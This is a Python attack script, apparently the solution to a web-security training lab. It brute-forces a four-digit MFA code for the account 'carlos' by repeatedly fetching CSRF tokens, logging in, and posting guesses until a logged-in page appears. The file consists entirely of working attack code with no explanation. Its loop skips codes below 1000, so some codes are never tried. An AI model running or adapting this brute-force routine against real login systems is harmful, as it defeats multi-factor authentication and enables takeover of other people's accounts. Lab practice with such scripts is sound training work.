import requests
import sys
import re
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def extract_csrf_token(response_text):
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text)
    if not csrf_token_match:
        print("[-] Failed to extract CSRF token. Exiting.")
        return None
    return csrf_token_match.group(1)

def make_request(session, method, url, data=None):
    if method == 'GET':
        return session.get(url, verify=False, proxies=proxies)
    elif method == 'POST':
        return session.post(url, data=data, verify=False, proxies=proxies)

def brute_force_mfa(s, url):
    print("[+] Brute-forcing Carlos's MFA...")

    for i in range(1000, 10000):
        login_url = url + "/login"

        # Step 1: Get CSRF token from the login page
        login_response = make_request(s, 'GET', login_url)
        csrf_token = extract_csrf_token(login_response.text)
        if not csrf_token:
            return

        # Step 2: Perform login
        login_data = {"csrf": csrf_token, "username": "carlos", "password": "montoya"}
        make_request(s, 'POST', login_url, data=login_data)

        # Step 3: Get CSRF token from the logged-in page
        mfa_url = url + "/login2"
        mfa_response = make_request(s, 'GET', mfa_url)
        csrf_token = extract_csrf_token(mfa_response.text)
        if not csrf_token:
            return

        # Step 4: Perform MFA attempt
        mfa_data = {"csrf": csrf_token, "mfa-code": i}
        mfa_response = make_request(s, 'POST', mfa_url, data=mfa_data)

        if 'Log out' in mfa_response.text:
            print("[+] Successfully logged into Carlos's account.")
            print("[+] The mfa code is:", i)
            break

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    brute_force_mfa(s, url)

if __name__ == "__main__":
    main()
